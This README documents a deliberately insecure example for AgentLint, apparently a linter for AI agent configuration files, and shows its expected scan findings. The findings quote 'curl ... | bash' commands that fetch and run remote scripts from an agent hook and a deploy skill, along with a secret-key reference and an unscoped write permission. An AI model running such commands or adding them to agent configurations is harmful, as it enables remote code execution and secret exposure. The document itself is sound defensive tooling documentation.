# Realistic Example

A practical example showing agent configurations with security issues that AgentLint detects.

## Contents

- `CLAUDE.md` - Project documentation referencing secrets
- `.claude/skills/deploy.md` - Deployment skill with risky patterns
- `.claude/hooks/post_edit.sh` - Hook with remote code execution
- `.cursorrules` - Cursor rules with network access

## Security Issues Demonstrated

This example intentionally includes common security anti-patterns:

1. **Dynamic Shell Execution (EXEC-001)** - `curl | bash` pattern
2. **Shell in Hook Context (EXEC-002)** - Hooks running shell commands
3. **Remote Script Fetch (NET-002)** - Fetching executable content
4. **Secret References (SEC-001)** - References to `$STRIPE_SECRET_KEY`, etc.
5. **Unscoped Write Access (FS-001)** - "write to any file" permission

## Run AgentLint

```bash
# From repo root
agentlint scan examples/realistic

# With JSON output
agentlint scan examples/realistic --format json

# With SARIF for GitHub
agentlint scan examples/realistic --format sarif --output results.sarif
```

## Expected Output

```
AgentLint scan: examples/realistic

Parsed: 4 documents (claude=3, cursor=1)
Context: hooks detected

Findings:
  HIGH  EXEC-001 Dynamic Shell Execution
    .claude/hooks/post_edit.sh:5-5
    Evidence: "curl https://tools.example.com/setup.sh | bash"

  HIGH  EXEC-001 Dynamic Shell Execution
    .claude/skills/deploy.md:18-18
    Evidence: "curl https://deploy.example.com/install.sh | bash"

  HIGH  EXEC-002 Shell Execution in Non-Interactive Context
    .claude/hooks/post_edit.sh:8-8
    Shell execution in hook context: Execute shell command

  HIGH  SEC-001 Environment Secret Reference
    CLAUDE.md:14-14
    Reference to secret environment variable: $STRIPE_SECRET_KEY

  HIGH  FS-001  Unscoped Write Access
    .claude/skills/deploy.md:28-28
    Unscoped write access detected

Status: FAIL (5 high)
```

This example is designed to fail, demonstrating AgentLint's detection capabilities.
